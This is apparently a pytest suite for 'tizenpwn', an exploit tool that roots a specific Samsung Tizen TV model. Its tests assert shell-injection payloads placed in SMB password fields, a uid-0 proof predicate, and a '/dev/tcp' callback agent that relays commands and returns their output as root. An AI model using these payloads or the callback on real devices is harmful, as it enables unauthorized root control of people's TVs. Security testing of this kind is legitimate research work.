import base64
import hashlib
import socket
import threading
from pathlib import Path, PurePosixPath

import pytest

from tizenpwn import tu7000
from tizenpwn.sdb import SdbError
from tizenpwn.tu7000 import (
    ARTIFACT_HASHES,
    MODEL,
    PROBE_COMMAND,
    SYSTEM_HASH_COMMAND,
    AgentServer,
    CifsRouteError,
    CifsRunIdentity,
    agent_code,
    assess_target,
    classify_uid0_once,
    fresh_agent_identity,
    fresh_identity,
    lab_context_sha256,
    uid0_predicate,
)


def probe_output(*, build: str, hashes: dict[str, str]) -> str:
    hash_lines = "".join(
        f"{value}  {path}\n" for path, value in hashes.items()
    )
    return (
        "uid=901(sdk) gid=901(sdk)\n"
        "TIZENPWN_KERNEL=4.1.10\n"
        "TIZENPWN_ARCHITECTURE=armv7l\n"
        "Tizen5/TV 5.5.0 (arm)\n"
        f"BUILD_ID={build}\n"
        "TIZENPWN_CAPABILITY_PS_AGENT=ready\n"
        "TIZENPWN_CAPABILITY_MOUNT_SMB=ready\n"
        "TIZENPWN_CAPABILITY_REMOTEPC=ready\n"
        f"{hash_lines}"
        "[exit:0]"
    )


class FakeClient:
    def __init__(
        self,
        *,
        model: str = MODEL,
        output: str | None = None,
        proof: bool = False,
    ) -> None:
        self.model = model
        self.output = output
        self.proof = proof
        self.injections: list[str] = []
        self.stage_exists = False
        self.stage_file = False

    def connect(self) -> None:
        pass

    def require_device(self) -> None:
        pass

    def reported_model(self) -> str:
        return self.model

    def require_shell_injection(self) -> None:
        pass

    def capture(self, command: str, *, timeout: float) -> object:
        if command == SYSTEM_HASH_COMMAND:
            text = "a" * 64 + "  /etc/passwd\n[exit:0]"
        elif command == PROBE_COMMAND:
            text = self.output or probe_output(
                build=tu7000.TESTED_BUILD,
                hashes=ARTIFACT_HASHES,
            )
        else:
            text = "absent\n[exit:0]"
        return type("Result", (), {"output": text, "transport_returncode": 0})()

    def inject(self, command: str, *, timeout: float) -> object:
        self.injections.append(command)
        self.stage_exists = self.proof
        return type("Result", (), {"returncode": 0})()

    def push(self, local_path: Path, remote_path: PurePosixPath) -> None:
        destination = str(remote_path)
        if destination.endswith("/attest"):
            if not self.stage_exists:
                raise SdbError(
                    "sdb push attest failed with exit 0: "
                    "error: failed to close "
                    f"'{destination}': Not a directory"
                )
            return
        if self.stage_exists:
            return
        self.stage_file = True


def test_fresh_identity_matches_lab_patterns() -> None:
    identity = fresh_identity()

    assert identity.password == (
        f"$(/usr/bin/id>{identity.marker})"
    )
    assert identity.marker.startswith("/home/owner/share/tmp/sr-")
    assert identity.share.startswith("TVROOT")
    assert identity.stage.startswith(
        "/home/owner/share/tmp/sdk_tools/r"
    )


def test_predicate_requires_regular_root_owned_marker_before_stage() -> None:
    identity = fresh_identity()
    predicate = uid0_predicate(identity)

    assert f"[ -f {identity.marker} ]" in predicate
    assert f"[ \"$(stat -c %u {identity.marker})\" = 0 ]" in predicate
    assert "grep -q '^uid=0(root) gid=0(root)'" in predicate
    assert predicate.endswith(f"mkdir {identity.stage}")


def test_exact_target_assessment_verifies_reviewed_artifacts() -> None:
    assessment = assess_target("192.0.2.10", client=FakeClient())

    assert assessment.model == MODEL
    assert (
        assessment.compatibility.fingerprint.build_id
        == tu7000.TESTED_BUILD
    )
    assert all(artifact.verified for artifact in assessment.artifacts)


def test_assessment_rejects_another_model_before_live_work() -> None:
    with pytest.raises(CifsRouteError, match="expected UN65TU7000FXZA"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(model="GQ55Q60TGUXZG"),
        )


def test_assessment_rejects_artifact_hash_mismatch() -> None:
    hashes = dict(ARTIFACT_HASHES)
    first = next(iter(hashes))
    hashes[first] = "0" * 64

    with pytest.raises(CifsRouteError, match="artifact hashes did not match"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(
                output=probe_output(
                    build=tu7000.TESTED_BUILD, hashes=hashes
                )
            ),
        )


def test_assessment_rejects_a_different_build() -> None:
    with pytest.raises(CifsRouteError, match="requires the tested build"):
        assess_target(
            "192.0.2.10",
            client=FakeClient(
                output=probe_output(
                    build="T-KTSU2AKUC-REL-202701010101",
                    hashes=ARTIFACT_HASHES,
                )
            ),
        )


def test_classifier_accepts_the_two_push_directory_shape() -> None:
    client = FakeClient(proof=True)
    identity = fresh_identity()

    assert classify_uid0_once(client, identity) is True
    assert client.injections == [uid0_predicate(identity)]


def test_classifier_rejects_a_created_file_without_retry() -> None:
    client = FakeClient(proof=False)
    identity = fresh_identity()

    assert classify_uid0_once(client, identity) is False
    assert len(client.injections) == 1


def test_identity_rejects_unsafe_paths() -> None:
    identity = CifsRunIdentity(
        run_id="0" * 16,
        marker="/tmp/../etc/passwd",
        share="TVROOT00000000",
        stage="/home/owner/share/tmp/sdk_tools/r" + "0" * 16,
        container="tizenpwn-cifs-" + "0" * 16,
    )

    with pytest.raises(CifsRouteError, match="marker path"):
        uid0_predicate(identity)


def test_lab_context_hash_is_stable_and_content_addressed() -> None:
    first = lab_context_sha256()
    second = lab_context_sha256()

    assert first == second
    assert len(first) == 64


def test_agent_identity_password_is_a_bounded_shell_injection() -> None:
    identity = fresh_agent_identity()

    assert identity.password.startswith(':;bash$IFS-c$IFS"$(cat$IFS')
    assert identity.path in identity.password
    assert identity.password.endswith(')"')
    assert " " not in identity.password


def test_agent_code_contains_callback_secret_and_protocol() -> None:
    identity = fresh_agent_identity()
    code = agent_code(identity, "192.0.2.10", 4567)

    assert "/dev/tcp/192.0.2.10/4567" in code
    assert identity.secret in code
    assert "sha256sum" in code
    assert "base64 -d" in code
    assert "__EXIT__" in code


def test_agent_server_accepts_a_valid_challenge() -> None:
    identity = fresh_agent_identity()
    server = AgentServer("127.0.0.1", identity.secret)
    observed: dict[str, str] = {}

    def tv_side() -> None:
        with socket.create_connection(
            ("127.0.0.1", server.port), timeout=5
        ) as connection:
            reader = connection.makefile("rb")
            writer = connection.makefile("wb")
            nonce = reader.readline().decode("ascii").strip()
            digest = hashlib.sha256(
                (nonce + identity.secret).encode("ascii")
            ).hexdigest()
            writer.write((digest + "\n").encode("ascii"))
            writer.write(b"IDENTITY uid=0(root) gid=0(root)\n")
            writer.flush()
            command = base64.b64decode(
                reader.readline().decode("ascii")
            ).decode("utf-8")
            observed["command"] = command
            writer.write(
                (
                    "RESULT 0 "
                    + base64.b64encode(b"root-output").decode("ascii")
                    + "\n"
                ).encode("ascii")
            )
            writer.flush()
            observed["exit"] = reader.readline().decode("ascii").strip()

    thread = threading.Thread(target=tv_side)
    thread.start()
    try:
        root_identity, results = server.accept_and_run(("id",), timeout=5)
    finally:
        server.close()
        thread.join(timeout=5)

    assert root_identity == "uid=0(root) gid=0(root)"
    assert results == [
        {"command": "id", "exit_code": 0, "stdout": "root-output"}
    ]
    assert observed == {"command": "id", "exit": "__EXIT__"}


def test_agent_server_rejects_a_bad_challenge() -> None:
    identity = fresh_agent_identity()
    server = AgentServer("127.0.0.1", identity.secret)

    def tv_side() -> None:
        with socket.create_connection(
            ("127.0.0.1", server.port), timeout=5
        ) as connection:
            reader = connection.makefile("rb")
            writer = connection.makefile("wb")
            reader.readline()
            writer.write(b"0" * 64 + b"\n")
            writer.flush()

    thread = threading.Thread(target=tv_side)
    thread.start()
    try:
        with pytest.raises(CifsRouteError, match="shared-secret challenge"):
            server.accept_and_run(("id",), timeout=5)
    finally:
        server.close()
        thread.join(timeout=5)


def test_cifs_lab_accepts_an_agent_identity() -> None:
    identity = fresh_agent_identity()

    lab = tu7000.CifsLab(
        identity,
        bind="192.0.2.10",
        rdp_port=3389,
        smb_port=445,
    )

    assert lab.identity.password == identity.password
